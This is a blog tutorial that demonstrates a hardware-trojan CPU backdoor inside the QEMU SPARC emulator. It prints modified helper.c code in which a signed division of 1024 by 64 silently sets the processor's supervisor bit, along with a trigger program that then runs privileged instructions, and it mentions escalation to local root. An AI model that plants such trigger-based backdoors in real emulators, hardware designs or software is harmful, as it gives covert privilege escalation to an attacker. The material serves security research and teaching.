---
layout: post
title:  "Testing a HW Trojan in QEMU for Sparc architecture"
date:   2018-05-31 10:38:12 +0200
categories: jekyll update
---
This is a short tutorial for implementation of the CPU backdoor with the help of QEMU emulator.
Sources for the implementation are available here : [https://github.com/AdamKostrzewa/qemuSparcTrojan](https://github.com/AdamKostrzewa/qemuSparcTrojan)


Requirements:
* QEMU emulator version 2.12.50 (v2.12.0-rc3-71-g6af2692e86-dirty)
cloned from [git clone git://git.qemu.org/qemu.git](git clone git://git.qemu.org/qemu.git) 
* buildroot-2018.02.1 for cross compilation
cloned from [git clone git://git.buildroot.net/buildroot](git clone git://git.buildroot.net/buildroot) 

You may install qemu sources with :

{% highlight shell %}
wget https://download.qemu.org/qemu-2.12.0.tar.xz
tar xvJf qemu-2.12.0.tar.xz
cd qemu-2.12.0
./configure
make
{% endhighlight %}

The buildroot must be configured for the sparc ISA cross-compilation.
In the buildroot directory use the following commands
{% highlight shell %}
$ make qemu_sparc_ss10_defconfig
$ make menuconfig
{% endhighlight %}

make menuconfig gives you access to the graphical configuration tools.
Select from the  "Toolchain" section the option "Build cross gdb for the host".
It is necessary as the default SPARC v8 config (qemu_sparc_ss10_defconfig) does not include 
cross-gdb by default. Save and exit the graphical interface. 
Later run:
{% highlight shell %}
$ make
{% endhighlight %}
The process of downloading and building the packages may take a while.
The gnu tools for cross-compilation (e.g. sparc-linux-gcc, sparc-linux-as, sparc-linux-gdb etc) 
are located in the buildroot home directory : <path-to-buildroo>/output/host/usr/bin. 
In order to use these tools outside of the folder add the location to the system PATH.


All sources were checked on (26-May-2018)
 

Description:

The goal of this project is to present the simple implementation of the CPU backdoor in the Sparc pipeline using the Qemu emulator.
The payload of the trojan will be included in the SDIV command and will change the state of the processor's state register.
The trigger will be appropriate div assembler command run with the selected operands (1024 and 64 appropriately). 
The trojan presents an example of the HW/SW codesign.


Application notes:

* Clone the repository with the trojan - https://github.com/AdamKostrzewa/qemuSparcTrojan
* Copy the translate.c file to the ~/qemu_path/target/sparc (where is ~/qemu_path/ is the path of the installation directory)
* Copy the helper.c file to the ~/qemu_path/target/sparc (where is ~/qemu_path/ is the path of the installation directory)
* Compile and run the qemu 
* Compile and run the regular.c
* Compile and run the trigger.c
* run the simulation with the selected Linux Kernel

In my case I am running the following linux kernel:
Linux buildroot 4.11.12 #1 Wed May 2 10:20:04 CEST 2018 sparc GNU/Linux

it is loaded with the command:
{% highlight shell %}
KERNEL="zImage"
DISK="rootfs.ext2"
LOCATION="/path_to_buildroot/output/images"

./qemu/sparc-softmmu/qemu-system-sparc -kernel $LOCATION/$KERNEL \
-boot c \
-append "root=/dev/sda console=ttyS0" \
-nographic \
-m 256 \
-localtime \
-no-reboot \
-name rtlinux \
-net nic,vlan=0 -net user,vlan=0 \
-redir tcp:2222::22 \
-drive file=$LOCATION/$DISK,format=raw \
-monitor tcp:127.0.0.1:55555,server,nowait;
{% endhighlight %}

** Execution of the regular.c in the buildroot **

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>

extern __inline__ unsigned long get_psr(void) {
	unsigned int retval;
	__asm__ __volatile__("rd %%psr, %0\n\t" :
			     "=r" (retval) :);
	return (retval);
}

int main(){

	printf("Demo Application - Trojan Trigger\n");
	int a = 1024;
	int b = 63;
	int c = a / b;
	
//	int psr = get_psr();
	
	printf("a=%d b=%d \nc= a / b = %d \n", a, b, c);
	getchar();

	int *x = NULL;  
	int y = *x;	// null pointer dereference

	return 0;
}
{% endhighlight %}

The result of execution is simple.
The null pointer dereference will lead to a segmentation fault handled by the operating system (trap and interrupt).
An exemplary output of the execution will look as follows:
{% highlight shell %}
$ ./b.out
Demo Application - Trojan Trigger
a=1024 b=63 
c= a / b = 16 

b.out[108]: segfault at 0 ip 00010420 (rpc 000103fc) sp efcabca8 error 30001 in b.out[10000+f000]
Segmentation fault
{% endhighlight %}

If we un-comment the get_psr() function the execution will stop earlier
as processor is running in the user mode, and we are not allowed to use the privileged instructions.
The console output will then look as follows:
{% highlight shell %}
$ ./b.out
Demo Application - Trojan Trigger
Illegal instruction
{% endhighlight %}

** Execution of thge trojans's trigger.c in the buildroot **

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>

extern __inline__ unsigned long get_psr(void) {
	unsigned int retval;
	__asm__ __volatile__("rd %%psr, %0\n\t" :
			     "=r" (retval) :);
	return (retval);
}

extern __inline__ void put_psr(unsigned int new_psr)
{
	__asm__ __volatile__("wr %0, 0x0, %%psr\n\t"
			     "nop; nop; nop;" : :
 			     "r" (new_psr));
}


int main(){

	printf("Demo Application - Trojan Trigger\n");

	int a = 1024;
	int b = 64;
	int c = a / b;
	
	int psr = get_psr();
	put_psr(psr ^ 0x80);
	
	printf("a=%d b=%d \nc= a / b = %d \n", a, b, c);
	getchar();
	printf("PSR %x \n", psr);
 	getchar();

	c = a / b;
	int *x = NULL;  // x is a null pointer
	int y = *x;	// null pointer dereference

	return 0;
}
{% endhighlight %}


The trigger.c file contains the triggering signal, i.e., division with operands int a = 1024;
	int b = 64; 	int c = a / b; Consequently after its execution we are able to use get_psr and put_psr functions
	without the "Illegal instruction" error.
	
Exemplary output of the execution looks as follows:
{% highlight shell %}
$ ./a.out
Demo Application - Trojan Trigger
a=1024 b=64 
c= a / b = 16 

PSR 40000a5 
{% endhighlight %}
As we see the processor was in the kernel mode after the activation (8th bit of the PSR).
Therefore, attacker has access to all commands and all memory operations
and can conduct local privilege escalation  (local root) by overwriting privileges of the own process
at the kernel's stack.

BUT BE CAREFUL!
In kernel mode system is really fragile and every pointer de-reference may finish in permanent crash:
{% highlight shell %}
$ ./a.out
Demo Application - Trojan Trigger
a=1024 b=64 
c= a / b = 16 

PSR 40000a5 
^[[A
Unable to handle kernel NULL pointer dereference
tsk->{mm,active_mm}->context = 00000000
tsk->{mm,active_mm}->pgd = 00000000
              \|/ ____ \|/
              "@'/ ,. \`@"
              /_| \__/ |_\
                 \__U_/
(null)(0): Oops [#1]
CPU: 0 PID: 0 Comm: (null) Not tainted 4.11.12 #1
task:   (null) task.stack:   (null)
PSR: 040000c7 PC: f0011284 NPC: f0011288 Y: 00000000    Not tainted
PC: <do_sparc_fault+0x8/0x420>
%G: 00000000 00000000  00000000 00000001  00000001 00003d20  00000010 000348e0
%O: 00000004 000302d8  00001000 fb041048  00000001 fb2baaa8  ef965958 f00b9358
RPC: <SyS_read+0x2c/0x8c>
%L: 040000c1 00010908  00017f88 00000004  04000301 00000000  00000000 00030000
%I: ef965a20 00000000  00000000 00000000  fb2baaa0 fb2baaa0  ef9659c0 f0007ee4
Disabling lock debugging due to kernel taint
Instruction DUMP:
 82062004 
 9de3bf98 
 e0060000 
<e201a004>
 80a66000 
 02800003 
 a00c2040 
 f6062004 
 033bffff 

Kernel panic - not syncing: Attempted to kill the idle task!
Press Stop-A (L1-A) from sun keyboard or send break
twice on console to return to the boot prom
---[ end Kernel panic - not syncing: Attempted to kill the idle task!

 {% endhighlight %}


The payload is included in the s_div function of the do_sdif function in helper.c of the target/sparc in qemu.

{% highlight c %}
static target_ulong do_sdiv(CPUSPARCState *env, target_ulong a,
target_ulong b, int cc, uintptr_t ra)
{
int overflow = 0;
int64_t x0;
int32_t x1;

x0 = (a & 0xffffffff) | ((int64_t) (env->y) << 32);
x1 = (b & 0xffffffff);

// trojans payload
if(x0 == 1024 && x1 == 64){
CPUState *cs = CPU(sparc_env_get_cpu(env));
SPARCCPU *cpu = SPARC_CPU(cs);
CPUSPARCState *sc = &cpu->env;
sc->psrs =1;
}


if (x1 == 0) {
cpu_raise_exception_ra(env, TT_DIV_ZERO, ra);
} else if (x1 == -1 && x0 == INT64_MIN) {
x0 = INT32_MAX;
overflow = 1;
} else {
x0 = x0 / x1;
if ((int32_t) x0 != x0) {
x0 = x0 < 0 ? INT32_MIN : INT32_MAX;
overflow = 1;
}
}

if (cc) {
env->cc_dst = x0;
env->cc_src2 = overflow;
env->cc_op = CC_OP_DIV;
}
return x0;
}
{% endhighlight %}

The actions of the payload are fairly simple:
* we check the value of the operands (x0 == 1024 && x1 == 64)
* we cas the CPU object to the CPUSPARCState *sc. The sc contains values of the SPARC CPU register
as they are different from x86 and must be casted at runtime.
* we modify the eight bit of the PSR register sc->psrs =1;




If we are still in user mode the exception is raised as RDPSR | WRPSR are privileged instructions.
Consult the SPARC Manual v8 for more details.

